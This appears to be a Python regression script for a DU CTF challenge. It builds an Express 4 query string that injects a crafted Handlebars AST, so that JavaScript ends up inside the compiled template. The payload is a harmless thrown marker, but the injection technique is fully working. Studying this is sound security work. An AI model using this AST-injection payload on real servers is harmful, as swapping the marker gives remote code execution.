"""DU CTF request-handling (Express 4): query-parser AST injection.

The original challenge calls Handlebars.compile(req.query.x) with an object
provided by Express 4's nested query parser. Handlebars treats the object as
a preconstructed Program AST. A crafted MustacheStatement NumberLiteral value
is emitted in generated JS. For safe local regression, the expression throws
a fixed harmless marker instead of invoking child_process or commands.

Only original locally installed Express/Handlebars instances are exercised.
No network target or actual hosted flag is contacted.
"""
import argparse
import re
from pathlib import Path

MARKER = "DUCTF_PHASE16_AST_MARKER"


def validate_source(dockerfile: str) -> None:
    expressions = (
        r"npm install express@4 handlebars",
        r"Handlebars\.compile\(req\.query\.x\)\(\{\}\)",
        r"app\.get\('/'",
    )
    if any(re.search(pattern, dockerfile) is None for pattern in expressions):
        raise ValueError("Original Express 4 challenge behavior differs")


def query_tree(marker: str = MARKER) -> dict[str, str]:
    if not re.fullmatch(r"[A-Z0-9_]{8,80}", marker):
        raise ValueError("Only harmless local marker text is accepted")
    # Deliberately execute no shell commands: a thrown marker is sufficient
    # evidence that the constructed AST entered generated JavaScript.
    expression = f"function () {{throw new Error('{marker}')}}()"
    return {
        "x[type]": "Program",
        "x[body][0][type]": "MustacheStatement",
        "x[body][0][path]": "0",
        "x[body][0][loc][start]": "0",
        "x[body][0][loc][end]": "0",
        "x[body][0][params][0][type]": "NumberLiteral",
        "x[body][0][params][0][value]": expression,
    }


def query_string(marker: str = MARKER) -> str:
    from urllib.parse import urlencode
    return urlencode(query_tree(marker))


def check_local_result(status: int, body: str, marker: str = MARKER) -> bool:
    if status != 500 or marker not in body:
        raise ValueError("Original Handlebars AST payload was not evaluated")
    return True


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("original_dockerfile", type=Path)
    args = parser.parse_args()
    validate_source(args.original_dockerfile.read_text(encoding="utf-8"))
    print("Local-only AST demonstration parameters:")
    print(query_string())
    print("Node integration tests validate this against the original app.")


if __name__ == "__main__":
    main()
